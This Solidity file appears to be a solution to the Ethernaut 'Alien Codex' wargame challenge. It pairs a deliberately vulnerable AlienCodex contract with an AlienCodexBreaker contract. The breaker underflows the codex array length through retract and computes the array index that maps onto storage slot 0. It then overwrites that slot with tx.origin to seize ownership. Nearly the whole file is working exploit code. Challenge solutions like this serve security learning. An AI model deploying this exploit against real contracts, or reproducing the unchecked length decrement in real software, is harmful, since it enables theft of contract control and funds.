// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../general/Ownable_0.5.0.sol";

contract AlienCodexBreaker {
    constructor(address addr) public {
        AlienCodex ac = AlienCodex(addr);
        ac.makeContact();
        ac.retract();
        uint256 location = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index = 0 - location;
        ac.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
